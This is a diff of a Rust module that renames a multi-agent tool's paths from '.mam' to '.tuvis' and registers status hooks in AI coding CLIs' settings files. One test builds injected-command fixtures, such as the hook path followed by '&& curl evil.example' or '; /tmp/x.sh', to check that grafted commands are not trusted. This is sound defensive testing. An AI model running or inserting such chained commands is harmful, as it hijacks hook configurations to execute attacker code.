@@ -18,8 +18,8 @@ use crate::monitor::hook_listener;
 /// 事件名等基础字段（问答识别回落通道 B=端点扫描会话消息，见 remote/api.rs 端点注释）
 const HOOK_SCRIPT: &str = r#"#!/bin/bash
 # MultiAgents Manager 状态 Hook 脚本
-# 从 stdin 读取 JSON，写入 ~/.mam/events/<session_id>.json
-EVENTS_DIR="$HOME/.mam/events"
+# 从 stdin 读取 JSON，写入 ~/.tuvis/events/<session_id>.json
+EVENTS_DIR="$HOME/.tuvis/events"
 mkdir -p "$EVENTS_DIR"
 INPUT=$(cat)
 EVENT=$(echo "$INPUT" | grep -o '"hook_event_name"[[:space:]]*:[[:space:]]*"[^"]*"' | sed 's/.*"\([^"]*\)"$/\1/')
@@ -39,9 +39,9 @@ fi
 
 /// 确保 Hook 脚本和事件目录存在
 pub fn ensure_hook_script() -> PathBuf {
-    let mam_dir = dirs::home_dir().unwrap_or_default().join(".mam");
+    let mam_dir = dirs::home_dir().unwrap_or_default().join(".tuvis");
     let hooks_dir = mam_dir.join("hooks");
-    // 事件目录与 helper 写侧同源（hook_listener::default_events_dir，MAM_HOME
+    // 事件目录与 helper 写侧同源（hook_listener::default_events_dir，TUVIS_HOME
     // debug 重定向同 connection.rs 先例）。bash 版脚本内部仍硬编码 $HOME——
     // Windows/正式链路已由原生 helper 承载（批次甲 T1），unix dev 重定向场景属
     // 已知边界（脚本目录 hooks/ 保持真实家目录，避免 unix 存量注册路径漂移）
@@ -61,36 +61,36 @@ pub fn ensure_hook_script() -> PathBuf {
             let _ = fs::set_permissions(&script_path, perms);
         }
     }
-    // marker helper 安装（issue #43）：把与主程序同目录的 mam-marker 拷到 ~/.mam/bin/
-    // 供 MAM 主进程跳转按需注入调用（window/win32.rs::inject_marker_on_demand）。
+    // marker helper 安装（issue #43）：把与主程序同目录的 tuvis-marker 拷到 ~/.tuvis/bin/
+    // 供 兔维斯 主进程跳转按需注入调用（window/win32.rs::inject_marker_on_demand）。
     // helper 未构建/未随包分发是合法状态——主进程检测不到即跳过注入，
     // 跳转链完整回落既有消歧层（零回归）。无条件覆盖保证升级后新版 helper 生效
     install_marker_helper();
-    // hook 事件 helper 安装（批次甲 T1）：同一分发管道落盘 mam-hook-listener，
+    // hook 事件 helper 安装（批次甲 T1）：同一分发管道落盘 tuvis-hook-listener，
     // 供 hook 配置直启（零 shell 依赖，替代 bash 脚本）。缺失同样是合法状态——
     // 注册侧检测不到即回落 bash 形态命令（零回归）
     install_hook_listener_helper();
     script_path
 }
 
-/// helper 安装目标目录解析（纯函数）：home → `~/.mam/bin`
+/// helper 安装目标目录解析（纯函数）：home → `~/.tuvis/bin`
 fn helper_install_dir(home: &std::path::Path) -> PathBuf {
-    home.join(".mam").join("bin")
+    home.join(".tuvis").join("bin")
 }
 
-/// 拷贝 mam-marker helper 到 ~/.mam/bin/（存在才拷；返回目标路径）
+/// 拷贝 tuvis-marker helper 到 ~/.tuvis/bin/（存在才拷；返回目标路径）
 fn install_marker_helper() -> Option<PathBuf> {
-    install_helper_bin(&["mam-marker.exe", "mam-marker"])
+    install_helper_bin(&["tuvis-marker.exe", "tuvis-marker"])
 }
 
-/// 拷贝 mam-hook-listener helper 到 ~/.mam/bin/（批次甲 T1；返回目标路径）。
+/// 拷贝 tuvis-hook-listener helper 到 ~/.tuvis/bin/（批次甲 T1；返回目标路径）。
 /// 未构建/未随包分发 → None（注册回落 bash 形态，零回归）
 pub(crate) fn install_hook_listener_helper() -> Option<PathBuf> {
-    install_helper_bin(&["mam-hook-listener.exe", "mam-hook-listener"])
+    install_helper_bin(&["tuvis-hook-listener.exe", "tuvis-hook-listener"])
 }
 
 /// helper 分发入口（marker / hook-listener 共用核心）：从当前 exe 同目录拷候选名
-/// 到 `~/.mam/bin/`（无条件覆盖，升级后新版 helper 生效）
+/// 到 `~/.tuvis/bin/`（无条件覆盖，升级后新版 helper 生效）
 fn install_helper_bin(names: &[&str]) -> Option<PathBuf> {
     let exe = std::env::current_exe().ok()?;
     let src_dir = exe.parent()?.to_path_buf();
@@ -126,7 +126,7 @@ fn install_helper_from_to(
         }
     }
     // **已有安装副本回退**（2026-10-03 事故修复）：源目录没有候选（如无 feature 的
-    // `cargo build` 不产出 helper exe——cargo clean 后必然发生）但 `~/.mam/bin/` 里
+    // `cargo build` 不产出 helper exe——cargo clean 后必然发生）但 `~/.tuvis/bin/` 里
     // 躺着**先前安装的副本**时，返回该副本而非 None。返回 None 会让注册规格回落
     // bash 形态，启动注册把用户 settings 里**更丰富的 helper 条目原地改写成 bash**
     //（问答通道的 tool_name/tool_input 全丢——多选题误判审批卡的事故根因）。
@@ -276,13 +276,13 @@ fn ours_markers(script_path_str: &str, spec: &HookCommandSpec) -> Vec<String> {
     markers
 }
 
-/// 条目命令是否 MAM 注册（含任一标记即算——`contains` 语义与 F3 迁移判据同源）
+/// 条目命令是否 兔维斯 注册（含任一标记即算——`contains` 语义与 F3 迁移判据同源）
 fn command_is_ours(command: &str, markers: &[String]) -> bool {
     markers.iter().any(|m| command.contains(m.as_str()))
 }
 
 /// F3 旧键迁移纯函数（PascalCase 注册形态专用；跨平台可测）：把 event（如 "Stop"）
-/// 的首字母小写旧键（"stop"）从 hooks 配置移除——**仅当旧键全部条目都是 MAM 注册**
+/// 的首字母小写旧键（"stop"）从 hooks 配置移除——**仅当旧键全部条目都是 兔维斯 注册**
 /// （每条 command 命中我方标记集 [`ours_markers`]：脚本路径/helper 路径 × 正反斜杠
 /// 双形态）；混有用户条目 → 保守不动（codex 对未知键不触发，残留无害）。旧键不
 /// 存在 → false。返回 true 表示发生了移除（计入 migrated 保证纯迁移场景也持久化）。
@@ -412,7 +412,7 @@ fn event_hooks_converged(
     ours_entries == 1 && converged
 }
 
-/// 单个 hook 命令对象是否 MAM 注册（command 命中我方标记集）
+/// 单个 hook 命令对象是否 兔维斯 注册（command 命中我方标记集）
 fn hook_command_is_ours(h: &serde_json::Value, markers: &[String]) -> bool {
     h.get("command")
         .and_then(|c| c.as_str())
@@ -471,7 +471,7 @@ pub(crate) fn register_hooks_for_tool(
     .map(|_| ())
 }
 
-/// 注册核心（tempfile 可测缝：脚本路径/命令规格显式注入，零接触真实 ~/.mam）。
+/// 注册核心（tempfile 可测缝：脚本路径/命令规格显式注入，零接触真实 ~/.tuvis）。
 /// 返回 (新增条目数, 迁移条目数)。
 fn register_hooks_in_file(
     config_path: &std::path::Path,
@@ -526,7 +526,7 @@ fn register_hooks_in_file(
         let mut migrated_this_event = 0usize;
 
         // F3 旧键迁移（仅 PascalCase 注册形态；codex hook_event_case CamelCase→
-        // PascalCase 存量修正，2026-09-20）：旧注册把 MAM 条目写在首字母小写键下
+        // PascalCase 存量修正，2026-09-20）：旧注册把 兔维斯 条目写在首字母小写键下
         // （如 "stop"），codex 0.155.x 只认 PascalCase 键——旧键永不触发但残留
         // 文件。移除判据见 [`remove_legacy_camel_key`]。
         // 跨键移除只计入迁移日志（migrated），**不参与下方 skip 守卫**：旧键条目
@@ -823,7 +823,7 @@ fn hooks_toml_verified(content: &str, spec_command: &str, events: &[&str]) -> bo
 
 /// 读取所有 Hook 事件文件，返回 session_id → 事件数据的映射（键由脚本侧
 /// 文件名承载；旧 PPID 形态文件 30s TTL 内短暂并存、键永不匹配任何会话，无害）。
-/// 目录定位与 helper 写侧同源（hook_listener::default_events_dir，MAM_HOME debug
+/// 目录定位与 helper 写侧同源（hook_listener::default_events_dir，TUVIS_HOME debug
 /// 重定向口径一致——写读两侧经同一函数出路径，任何配置下互不脱靶）
 pub fn read_hook_events() -> HashMap<String, HookEvent> {
     let events_dir = hook_listener::default_events_dir();
@@ -1017,7 +1017,7 @@ pub fn register_all_hooks() {
         Box::new(KimiAdapter),
     ];
     let script_path = ensure_hook_script();
-    // T1 原生 helper：随启动分发管道落盘（mam-hook-listener）；未构建/未随包分发
+    // T1 原生 helper：随启动分发管道落盘（tuvis-hook-listener）；未构建/未随包分发
     // 是合法状态 → None → claude/codex 规格回落 bash 形态命令（零回归）；kimi 无
     // bash 兜底通道（T2 接入前本就无 hook）→ 跳过注册维持原状
     let helper_path = install_hook_listener_helper();
@@ -1133,7 +1133,7 @@ fn command_is_pure_ours(command: &str, markers: &[String]) -> bool {
 /// 信任**）。`~/.codex/hooks.json` 存在且**每个 hook 命令都命中我方注册形态**
 /// （[`command_is_pure_ours`] 结构化等值判据——评审 P2 收紧后 contains 不再
 /// 用于此场景）→ true：新建管线遇「Hooks need review」审查框可代发 '2'
-/// （Trust all——信任的确实是 MAM 自己注册的 hooks，远程创建的状态上报闭环）；
+/// （Trust all——信任的确实是 兔维斯 自己注册的 hooks，远程创建的状态上报闭环）；
 /// 文件缺失/损坏/空事件/混有非我方条目/嫁接命令（我方路径后接私货）→ false：
 /// esc 跳过（屏面明示 `esc skip`，不信任只解锁 composer，保守不代用户做混杂态
 /// 的信任决定）。
@@ -1159,9 +1159,9 @@ pub fn codex_hooks_all_ours(home: &std::path::Path) -> bool {
     // 脚本 / commandWindows=helper 直启）全覆盖
     let mut markers = Vec::new();
     for p in [
-        home.join(".mam").join("hooks").join("status-hook.sh"),
-        home.join(".mam").join("bin").join("mam-hook-listener.exe"),
-        home.join(".mam").join("bin").join("mam-hook-listener"),
+        home.join(".tuvis").join("hooks").join("status-hook.sh"),
+        home.join(".tuvis").join("bin").join("tuvis-hook-listener.exe"),
+        home.join(".tuvis").join("bin").join("tuvis-hook-listener"),
     ] {
         let s = p.to_string_lossy().to_string();
         markers.push(s.replace('\\', "/"));
@@ -1207,8 +1207,8 @@ mod command_quote_tests {
         // 第四轮实测：裸反斜杠路径被 bash 当转义序列吃掉（C:\Users → C:Users，
         // exit=127 通道全断）；正斜杠 + 无引号在 powershell 包装 / bash 两层皆安全
         assert_eq!(
-            quote_bash_command(r"C:\Users\bunny\.mam\hooks\status-hook.sh"),
-            r"bash C:/Users/bunny/.mam/hooks/status-hook.sh"
+            quote_bash_command(r"C:\Users\bunny\.tuvis\hooks\status-hook.sh"),
+            r"bash C:/Users/bunny/.tuvis/hooks/status-hook.sh"
         );
     }
 
@@ -1221,11 +1221,11 @@ mod command_quote_tests {
         let cfg = td.path().join(".codex").join("hooks.json");
         std::fs::create_dir_all(cfg.parent().unwrap()).unwrap();
         let ours_cmd = format!(
-            "bash {}/.mam/hooks/status-hook.sh",
+            "bash {}/.tuvis/hooks/status-hook.sh",
             td.path().to_string_lossy().replace('\\', "/")
         );
         let ours_win = format!(
-            "{}/.mam/bin/mam-hook-listener.exe",
+            "{}/.tuvis/bin/tuvis-hook-listener.exe",
             td.path().to_string_lossy().replace('\\', "/")
         );
         // JSON 夹具用占位符 + replace 组装（format! 的 JSON 花括号转义不可读）
@@ -1254,13 +1254,13 @@ mod command_quote_tests {
         let cfg = td.path().join(".codex").join("hooks.json");
         std::fs::create_dir_all(cfg.parent().unwrap()).unwrap();
         let home_fwd = td.path().to_string_lossy().replace('\\', "/");
-        let ours_win = format!("{home_fwd}/.mam/bin/mam-hook-listener.exe");
+        let ours_win = format!("{home_fwd}/.tuvis/bin/tuvis-hook-listener.exe");
         for graft in [
             // 我方路径 + 链式私货（contains 时代的假阳形态）
-            format!("bash {home_fwd}/.mam/hooks/status-hook.sh; /tmp/x.sh"),
-            format!("{home_fwd}/.mam/bin/mam-hook-listener.exe && curl evil.example"),
+            format!("bash {home_fwd}/.tuvis/hooks/status-hook.sh; /tmp/x.sh"),
+            format!("{home_fwd}/.tuvis/bin/tuvis-hook-listener.exe && curl evil.example"),
             // 我方路径仅作参数夹带
-            format!("node /tmp/x.js {home_fwd}/.mam/hooks/status-hook.sh"),
+            format!("node /tmp/x.js {home_fwd}/.tuvis/hooks/status-hook.sh"),
         ] {
             let json = r#"{"hooks":{"PreToolUse":[{"matcher":"","hooks":[{"type":"command","command":"__G__","commandWindows":"__WIN__"}]}]}}"#
                 .replace("__G__", &graft)
@@ -1272,7 +1272,7 @@ mod command_quote_tests {
             );
         }
         // 对照：纯我方形态（bash 脚本 + helper 直启 + 引号包裹变体）仍放行
-        let ok = r#"{"hooks":{"SessionEnd":[{"matcher":"","hooks":[{"type":"command","command":"bash __HOME__/.mam/hooks/status-hook.sh","commandWindows":"__WIN__"}]}]}}"#
+        let ok = r#"{"hooks":{"SessionEnd":[{"matcher":"","hooks":[{"type":"command","command":"bash __HOME__/.tuvis/hooks/status-hook.sh","commandWindows":"__WIN__"}]}]}}"#
             .replace("__HOME__", &home_fwd)
             .replace("__WIN__", &ours_win);
         std::fs::write(&cfg, &ok).unwrap();
@@ -1303,8 +1303,8 @@ mod command_quote_tests {
         // 含空格路径必须保引号（已知残留：该形态 SessionStart 报错可能复现，spec 3.4）；
         // 分隔符仍归一为正斜杠（bash 端语义一致）
         assert_eq!(
-            quote_bash_command(r"C:\Users\John Doe\.mam\hooks\status-hook.sh"),
-            r#"bash "C:/Users/John Doe/.mam/hooks/status-hook.sh""#
+            quote_bash_command(r"C:\Users\John Doe\.tuvis\hooks\status-hook.sh"),
+            r#"bash "C:/Users/John Doe/.tuvis/hooks/status-hook.sh""#
         );
     }
 }
@@ -1324,8 +1324,8 @@ mod event_channel_tests {
     }
 
     /// 用独立 tempdir 作为 events 目录跑 read_hook_events（测试以 tempdir 直注核心
-    /// 逻辑，零接触真实 ~/.mam；T1 起 read_hook_events 目录定位与 helper 写侧同源
-    /// ——hook_listener::default_events_dir，MAM_HOME debug 重定向两侧口径一致）
+    /// 逻辑，零接触真实 ~/.tuvis；T1 起 read_hook_events 目录定位与 helper 写侧同源
+    /// ——hook_listener::default_events_dir，TUVIS_HOME debug 重定向两侧口径一致）
     #[test]
     fn events_are_keyed_by_session_id_with_ttl() {
         let tmp = tempfile::tempdir().unwrap();
@@ -1344,7 +1344,7 @@ mod event_channel_tests {
         // spec 改动三：hook 周期注入退役；事件键 session_id 化（脚本内容回归锁）
         assert!(HOOK_SCRIPT.contains("$SESSION_ID.json"));
         assert!(!HOOK_SCRIPT.contains("MAM_MARKER"));
-        assert!(!HOOK_SCRIPT.contains("mam-marker"));
+        assert!(!HOOK_SCRIPT.contains("tuvis-marker"));
         assert!(HOOK_SCRIPT.contains("^[A-Za-z0-9_-]+$")); // 白名单守卫在场（含 kimi 下划线）
     }
 }
@@ -1383,9 +1383,9 @@ mod legacy_camel_key_tests {
         let mut obj = serde_json::Map::new();
         obj.insert(
             "stop".into(),
-            serde_json::json!([our_entry("bash C:/Users/u/.mam/hooks/status-hook.sh")]),
+            serde_json::json!([our_entry("bash C:/Users/u/.tuvis/hooks/status-hook.sh")]),
         );
-        let (markers, _) = bash_spec(r"C:\Users\u\.mam\hooks\status-hook.sh", "x");
+        let (markers, _) = bash_spec(r"C:\Users\u\.tuvis\hooks\status-hook.sh", "x");
         assert!(remove_legacy_camel_key(&mut obj, "Stop", &markers));
         assert!(obj.get("stop").is_none(), "全我们条目的旧键必须移除");
     }
@@ -1397,11 +1397,11 @@ mod legacy_camel_key_tests {
         obj.insert(
             "stop".into(),
             serde_json::json!([
-                our_entry("bash /home/u/.mam/hooks/status-hook.sh"),
+                our_entry("bash /home/u/.tuvis/hooks/status-hook.sh"),
                 { "matcher": "", "hooks": [{ "type": "command", "command": "user-own-script" }] }
             ]),
         );
-        let (markers, _) = bash_spec(r"C:\u\.mam\hooks\status-hook.sh", "x");
+        let (markers, _) = bash_spec(r"C:\u\.tuvis\hooks\status-hook.sh", "x");
         assert!(!remove_legacy_camel_key(&mut obj, "Stop", &markers));
         assert!(obj.get("stop").is_some(), "混用户条目不得移除");
     }
@@ -1426,12 +1426,12 @@ mod legacy_camel_key_tests {
         let mut obj = serde_json::Map::new();
         obj.insert(
             "stop".into(),
-            serde_json::json!([our_entry("C:/Users/u/.mam/bin/mam-hook-listener.exe")]),
+            serde_json::json!([our_entry("C:/Users/u/.tuvis/bin/tuvis-hook-listener.exe")]),
         );
         let spec = HookCommandSpec {
-            command: "C:/Users/u/.mam/bin/mam-hook-listener.exe".to_string(),
+            command: "C:/Users/u/.tuvis/bin/tuvis-hook-listener.exe".to_string(),
             command_windows: None,
-            helper_path: Some(r"C:\Users\u\.mam\bin\mam-hook-listener.exe".to_string()),
+            helper_path: Some(r"C:\Users\u\.tuvis\bin\tuvis-hook-listener.exe".to_string()),
         };
         assert!(remove_legacy_camel_key(
             &mut obj,
@@ -1566,11 +1566,11 @@ mod legacy_camel_key_tests {
         use super::hooks_file_verified;
         let script = "/x/status-hook.sh";
         let legacy = r#"{"hooks":{"Stop":[{"hooks":[{"command":"bash /x/status-hook.sh"}]}]}}"#;
-        let migrated = r#"{"hooks":{"Stop":[{"hooks":[{"command":"bash /x/status-hook.sh","commandWindows":"C:/u/.mam/bin/mam-hook-listener.exe"}]}]}}"#;
+        let migrated = r#"{"hooks":{"Stop":[{"hooks":[{"command":"bash /x/status-hook.sh","commandWindows":"C:/u/.tuvis/bin/tuvis-hook-listener.exe"}]}]}}"#;
         let spec = HookCommandSpec {
             command: "bash /x/status-hook.sh".to_string(),
-            command_windows: Some("C:/u/.mam/bin/mam-hook-listener.exe".to_string()),
-            helper_path: Some(r"C:\u\.mam\bin\mam-hook-listener.exe".to_string()),
+            command_windows: Some("C:/u/.tuvis/bin/tuvis-hook-listener.exe".to_string()),
+            helper_path: Some(r"C:\u\.tuvis\bin\tuvis-hook-listener.exe".to_string()),
         };
         assert!(
             !hooks_file_verified(legacy, script, &spec, &["Stop"], true, &[]),
@@ -1589,12 +1589,12 @@ mod legacy_camel_key_tests {
     #[test]
     fn hooks_file_verified_rejects_duplicate_our_entries() {
         use super::hooks_file_verified;
-        let script = "/u/.mam/hooks/status-hook.sh";
-        let helper_cmd = "C:/u/.mam/bin/mam-hook-listener.exe";
+        let script = "/u/.tuvis/hooks/status-hook.sh";
+        let helper_cmd = "C:/u/.tuvis/bin/tuvis-hook-listener.exe";
         let spec = HookCommandSpec {
             command: helper_cmd.to_string(),
             command_windows: None,
-            helper_path: Some(r"C:\u\.mam\bin\mam-hook-listener.exe".to_string()),
+            helper_path: Some(r"C:\u\.tuvis\bin\tuvis-hook-listener.exe".to_string()),
         };
         // 实机形态（2026-09-23 claude settings.json）：helper 条目 + bash 兜底条目并存
         let live = serde_json::json!({"hooks": {"PreToolUse": [
@@ -1645,8 +1645,8 @@ mod legacy_camel_key_tests {
         use super::{hooks_file_verified, register_hooks_in_file};
         let tmp = tempfile::tempdir().unwrap();
         let cfg = tmp.path().join("settings.json");
-        let script = "/u/.mam/hooks/status-hook.sh";
-        let helper_cmd = "C:/u/.mam/bin/mam-hook-listener.exe";
+        let script = "/u/.tuvis/hooks/status-hook.sh";
+        let helper_cmd = "C:/u/.tuvis/bin/tuvis-hook-listener.exe";
         let user_cmd = "node ~/my-own-hook.js";
         // 实机形态：helper（已等于规格）+ bash 兜底 + 用户条目，同一事件数组
         let live = serde_json::json!({"hooks": {"PreToolUse": [
@@ -1659,7 +1659,7 @@ mod legacy_camel_key_tests {
         let spec = HookCommandSpec {
             command: helper_cmd.to_string(),
             command_windows: None,
-            helper_path: Some(r"C:\u\.mam\bin\mam-hook-listener.exe".to_string()),
+            helper_path: Some(r"C:\u\.tuvis\bin\tuvis-hook-listener.exe".to_string()),
         };
         let (added, migrated) =
             register_hooks_in_file(&cfg, &["PreToolUse"], true, script, &spec, &[]).unwrap();
@@ -1673,7 +1673,7 @@ mod legacy_camel_key_tests {
             .iter()
             .flat_map(|e| e["hooks"].as_array().unwrap())
             .filter_map(|h| h["command"].as_str())
-            .filter(|c| c.contains("status-hook.sh") || c.contains("mam-hook-listener"))
+            .filter(|c| c.contains("status-hook.sh") || c.contains("tuvis-hook-listener"))
             .collect();
         assert_eq!(
             ours,
@@ -1704,8 +1704,8 @@ mod legacy_camel_key_tests {
         use super::register_hooks_in_file;
         let tmp = tempfile::tempdir().unwrap();
         let cfg = tmp.path().join("settings.json");
-        let script = "/u/.mam/hooks/status-hook.sh";
-        let helper_cmd = "C:/u/.mam/bin/mam-hook-listener.exe";
+        let script = "/u/.tuvis/hooks/status-hook.sh";
+        let helper_cmd = "C:/u/.tuvis/bin/tuvis-hook-listener.exe";
         let user_cmd = "node ~/my-own-hook.js";
         let live = serde_json::json!({"hooks": {"Stop": [
             { "matcher": "", "hooks": [
@@ -1719,7 +1719,7 @@ mod legacy_camel_key_tests {
         let spec = HookCommandSpec {
             command: helper_cmd.to_string(),
             command_windows: None,
-            helper_path: Some(r"C:\u\.mam\bin\mam-hook-listener.exe".to_string()),
+            helper_path: Some(r"C:\u\.tuvis\bin\tuvis-hook-listener.exe".to_string()),
         };
         register_hooks_in_file(&cfg, &["Stop"], true, script, &spec, &[]).unwrap();
 
@@ -1747,8 +1747,8 @@ mod legacy_camel_key_tests {
 ///    T2 起 8 键：六状态键 + PermissionRequest/Interrupt），
 ///    断言文件落盘 PascalCase 键 + 旧 camelCase 键被迁移清除；
 /// ② 人工步骤（Mac 回传清单 C-16/C-17）：跑一次真实 codex 交互会话，确认
-///    `~/.mam/events/<session_id>.json` 出现（hook 真触发；**须先在 TUI 内
-///    /hooks 信任 MAM 钩子一次**——信任门见 C-17）。
+///    `~/.tuvis/events/<session_id>.json` 出现（hook 真触发；**须先在 TUI 内
+///    /hooks 信任 兔维斯 钩子一次**——信任门见 C-17）。
 /// 本机无 codex 时测试失败（前置自检 `codex --version`）。
 #[test]
 #[ignore = "实机验证：改写真实 ~/.codex/hooks.json（M1A 前置，显式 --ignored 跑）"]
@@ -1824,11 +1824,11 @@ fn codex_pascal_case_registration_real_machine() {
 /// T2 事件真触发自检（#[ignore]：显式实机跑；**本任务只落测试代码不实跑，实跑归
 /// T7**）——注册后跑一次真实 codex 会话，验证钩子真的触发且事件文件落盘。
 ///
-/// 全程沙箱（零接触真实 ~/.codex 与 ~/.mam）：CODEX_HOME/MAM_HOME 均指 tempdir
-/// （CODEX_HOME 是 codex 官方配置根重定向；MAM_HOME 重定向仅 debug 构建的 helper
+/// 全程沙箱（零接触真实 ~/.codex 与 ~/.tuvis）：CODEX_HOME/TUVIS_HOME 均指 tempdir
+/// （CODEX_HOME 是 codex 官方配置根重定向；TUVIS_HOME 重定向仅 debug 构建的 helper
 /// 生效——hook_listener::app_data_home）。前置条件（任缺即 fail 并给指引）：
 /// ① codex 已安装且已登录（`codex exec` 无头跑一回合）；② helper 已按 debug 构建
-/// （`cargo build --bin mam-hook-listener --features hook-listener`）；③ 若历史
+/// （`cargo build --bin tuvis-hook-listener --features hook-listener`）；③ 若历史
 /// 会话已在 TUI 内 /hooks 信任过同 hash 钩子则免信任——否则 untrusted 钩子不触发，
 /// 测试会以信任门提示失败（这正是 C-17 验收项的自动形态）。
 #[test]
@@ -1862,12 +1862,12 @@ fn codex_hook_events_really_fire_in_real_session() {
     let ver = spawn_codex(&["--version"]).expect("codex 命令不可用——本测试需要实机安装 codex");
     assert!(ver.status.success(), "codex --version 失败");
 
-    // helper 必须已构建（debug）：MAM_HOME 重定向仅 debug 生效，release helper 会
-    // 把事件写进真实 ~/.mam——绝不接受
+    // helper 必须已构建（debug）：TUVIS_HOME 重定向仅 debug 生效，release helper 会
+    // 把事件写进真实 ~/.tuvis——绝不接受
     let exe_name = if cfg!(windows) {
-        "mam-hook-listener.exe"
+        "tuvis-hook-listener.exe"
     } else {
-        "mam-hook-listener"
+        "tuvis-hook-listener"
     };
     let target_dir = std::env::var("CARGO_TARGET_DIR")
         .map(std::path::PathBuf::from)
@@ -1875,11 +1875,11 @@ fn codex_hook_events_really_fire_in_real_session() {
     let helper = target_dir.join("debug").join(exe_name);
     assert!(
         helper.is_file(),
-        "helper 未构建：先跑 cargo build --bin mam-hook-listener --features hook-listener \
-         （必须 debug 构建——MAM_HOME 重定向仅 debug 生效，release helper 会写真实 ~/.mam）"
+        "helper 未构建：先跑 cargo build --bin tuvis-hook-listener --features hook-listener \
+         （必须 debug 构建——TUVIS_HOME 重定向仅 debug 生效，release helper 会写真实 ~/.tuvis）"
     );
 
-    // 沙箱：codex 配置根 / MAM 数据根 / 工作目录 全部 tempdir
+    // 沙箱：codex 配置根 / 兔维斯 数据根 / 工作目录 全部 tempdir
     let codex_home = tempfile::tempdir().unwrap();
     let mam_home = tempfile::tempdir().unwrap();
     let workdir = tempfile::tempdir().unwrap();
@@ -1901,7 +1901,7 @@ fn codex_hook_events_really_fire_in_real_session() {
     )
     .expect("沙箱 hooks.json 注册失败");
 
-    // 跑真实 codex 无头会话（env 注入 CODEX_HOME/MAM_HOME，子进程继承）
+    // 跑真实 codex 无头会话（env 注入 CODEX_HOME/TUVIS_HOME，子进程继承）
     // exec 会话同样走垫片回退（spawn 失败 → cmd /c codex exec …）
     let mut bare_exec = std::process::Command::new("codex");
     bare_exec
@@ -1910,7 +1910,7 @@ fn codex_hook_events_really_fire_in_real_session() {
         .arg(workdir.path())
         .arg("Reply with the single word: ok")
         .env("CODEX_HOME", codex_home.path())
-        .env("MAM_HOME", mam_home.path())
+        .env("TUVIS_HOME", mam_home.path())
         .stdout(std::process::Stdio::piped())
         .stderr(std::process::Stdio::piped());
     aug_path(&mut bare_exec);
@@ -1921,7 +1921,7 @@ fn codex_hook_events_really_fire_in_real_session() {
         .arg(workdir.path())
         .arg("Reply with the single word: ok")
         .env("CODEX_HOME", codex_home.path())
-        .env("MAM_HOME", mam_home.path())
+        .env("TUVIS_HOME", mam_home.path())
         .stdout(std::process::Stdio::piped())
         .stderr(std::process::Stdio::piped());
     aug_path(&mut sh_exec);
@@ -1932,7 +1932,7 @@ fn codex_hook_events_really_fire_in_real_session() {
 
     // 轮询事件目录 ≤180s（SessionStart/UserPromptSubmit 等会话期事件即应落盘；
     // 等 codex 自然退出再判，避免误杀慢启动）
-    let events_dir = mam_home.path().join(".mam").join("events");
+    let events_dir = mam_home.path().join(".tuvis").join("events");
     let deadline = std::time::Instant::now() + std::time::Duration::from_secs(180);
     let mut landed: Vec<std::path::PathBuf> = Vec::new();
     while std::time::Instant::now() < deadline {
@@ -1967,8 +1967,8 @@ fn codex_hook_events_really_fire_in_real_session() {
 
     assert!(
         !landed.is_empty(),
-        "180s 内 ~/.mam/events 无事件文件落盘——钩子未触发。按序排查：\
-         ① codex 信任门未过（TUI 内 /hooks 审阅并信任 MAM 钩子一次，C-17）；\
+        "180s 内 ~/.tuvis/events 无事件文件落盘——钩子未触发。按序排查：\
+         ① codex 信任门未过（TUI 内 /hooks 审阅并信任 兔维斯 钩子一次，C-17）；\
          ② codex 版本无 hooks 系统（<0.155）；③ codex exec 输出见上"
     );
     // 事件文件形态抽验：文件名即 session_id（白名单）、内容为读取侧格式
@@ -1989,7 +1989,7 @@ fn codex_hook_events_really_fire_in_real_session() {
 
 /// F8 实机自检（claude）：注册真实 helper 钩子 → 跑一次真实 claude 会话 →
 /// 断言 **事件文件真落盘**（全链取证：注册形态 → CLI 触发 → helper 管道 →
-/// `~/.mam/events/<session_id>.json`）。
+/// `~/.tuvis/events/<session_id>.json`）。
 ///
 /// 与 codex 版（[`codex_hook_events_really_fire_in_real_session`]）的三处差异，
 /// 均为 claude 侧实机取证结论（2026-09-21）：
@@ -2004,7 +2004,7 @@ fn codex_hook_events_really_fire_in_real_session() {
 ///    审批类事件的真触发归人工交互会话（验收清单 C-7/C-17 同族）。
 ///
 /// 前置：claude 已安装（无需登录——实测未登录态钩子照常触发）；helper 已 debug
-/// 构建（MAM_HOME 重定向仅 debug 生效，release helper 会写真实 ~/.mam）。
+/// 构建（TUVIS_HOME 重定向仅 debug 生效，release helper 会写真实 ~/.tuvis）。
 #[test]
 #[ignore = "实机验证：跑真实 claude 会话验证事件落盘（前置=debug helper；claude 无需登录）"]
 fn claude_hook_events_really_fire_in_real_session() {
@@ -2063,9 +2063,9 @@ impl LiveTool {
     }
 }
 
-/// 实机取证骨架（两家共用）：tempdir 沙箱（配置根 / MAM 数据根 / 工作目录）→
+/// 实机取证骨架（两家共用）：tempdir 沙箱（配置根 / 兔维斯 数据根 / 工作目录）→
 /// 按生产规格注册全部事件 → spawn 真实 CLI 无头会话（env 注入沙箱根）→ 轮询
-/// events 目录 → 断言落盘 + 形态合法。零接触真实 `~/.mam`（MAM_HOME 重定向）与
+/// events 目录 → 断言落盘 + 形态合法。零接触真实 `~/.tuvis`（TUVIS_HOME 重定向）与
 /// 真实工具配置（claude `--settings` / kimi 沙箱 KIMI_CODE_HOME）。
 #[cfg(test)]
 fn run_live_event_check(tool: LiveTool) {
@@ -2099,11 +2099,11 @@ fn run_live_event_check(tool: LiveTool) {
         .unwrap_or_else(|e| panic!("{} 命令不可用（本测试需实机安装）：{e}", tool.cli()));
     assert!(ver.status.success(), "{} --version 失败", tool.cli());
 
-    // helper 必须已 debug 构建（MAM_HOME 重定向仅 debug 生效）
+    // helper 必须已 debug 构建（TUVIS_HOME 重定向仅 debug 生效）
     let exe_name = if cfg!(windows) {
-        "mam-hook-listener.exe"
+        "tuvis-hook-listener.exe"
     } else {
-        "mam-hook-listener"
+        "tuvis-hook-listener"
     };
     let target_dir = std::env::var("CARGO_TARGET_DIR")
         .map(std::path::PathBuf::from)
@@ -2111,8 +2111,8 @@ fn run_live_event_check(tool: LiveTool) {
     let helper = target_dir.join("debug").join(exe_name);
     assert!(
         helper.is_file(),
-        "helper 未构建：先跑 cargo build --bin mam-hook-listener --features hook-listener \
-         （必须 debug 构建——MAM_HOME 重定向仅 debug 生效）"
+        "helper 未构建：先跑 cargo build --bin tuvis-hook-listener --features hook-listener \
+         （必须 debug 构建——TUVIS_HOME 重定向仅 debug 生效）"
     );
 
     let cfg_home = tempfile::tempdir().unwrap();
@@ -2174,7 +2174,7 @@ fn run_live_event_check(tool: LiveTool) {
     let args = tool.print_args();
     let mut bare = std::process::Command::new(tool.cli());
     bare.args(&args)
